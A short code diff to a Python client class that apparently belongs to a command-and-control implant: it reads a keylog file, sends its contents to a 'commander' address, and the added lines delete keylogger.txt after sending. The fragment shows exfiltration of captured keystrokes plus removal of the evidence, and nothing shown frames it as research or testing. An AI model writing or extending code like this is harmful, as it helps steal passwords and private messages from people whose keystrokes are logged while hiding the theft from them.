@@ -508,6 +508,8 @@ class Client:
                     content = f.read()
                 print(f"    Sending {len(content)} bytes to commander")
                 self.send_response(src_ip, CommandType.ACK, content)
+                if os.path.exists("keylogger.txt"):
+                    os.remove("keylogger.txt")
             except Exception as e:
                 print(f"    Error reading keylog: {e}")
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
